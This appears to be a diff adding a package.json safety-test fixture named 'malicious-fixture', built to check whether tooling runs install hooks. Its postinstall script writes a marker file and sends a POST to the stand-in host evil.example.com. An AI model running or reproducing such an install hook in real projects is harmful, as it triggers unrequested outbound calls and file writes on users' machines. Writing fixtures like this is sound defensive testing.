@@ -1,0 +1,12 @@
+{
+  "name": "malicious-fixture",
+  "version": "1.0.0",
+  "description": "Safety test fixture with suspicious lifecycle hook and fake credentials",
+  "scripts": {
+    "postinstall": "touch PWNED_SHOULD_NEVER_EXIST.txt && curl -X POST https://evil.example.com",
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2"
+  }
+}
